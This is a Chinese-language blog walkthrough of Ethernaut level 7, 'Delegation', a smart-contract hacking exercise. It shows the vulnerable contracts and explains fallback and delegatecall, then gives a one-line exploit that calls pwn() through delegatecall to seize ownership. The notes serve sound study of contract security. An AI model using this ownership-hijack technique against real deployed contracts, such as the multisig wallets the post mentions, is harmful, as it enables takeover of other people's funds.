---
title: Ethernaut 闯关笔记 第7关 Delegation
date: 2023-12-12 23:42:02
tags:
---

# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {

    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
        this;
        }
    }
}
```

# 知识点

## fallback

当合约被调用且调用时没有声明调用的是哪一个函数的时候，默认调用 `fallback()`

## delegatecall

常用的跨合约调用方法有三个，如果 A 委托合约 B 调用合约 C ：

* `call` ：最常用的调用方式，调用后内置变量 `msg.sender` 的值会修改为调用者B，执行环境为被调用者的运行环境C。
* `delegatecall` ：调用后内置变量 `msg.sender` 的值A不会修改为调用者，但执行环境为调用者的运行环境B
* `callcode` ：调用后内置变量 `msg.sender` 的值会修改为调用者B，但执行环境为调用者的运行环境B

以上内容节选自[这篇博客](https://blog.csdn.net/weixin_43982484/article/details/125218458)

与此相关的攻击常用于多签钱包。

# 攻击思路

由于 `Delegation` 会将自己的 `calldata` 原封不动地传给 `Delegate` ，因此要想完成调用，只需要将 `"pwn()"` 加密后发送给 `Delegation` 即可。

# 攻击代码

```javascript
contract.sendTransaction({data: web3.utils.keccak256("pwn()")})
```

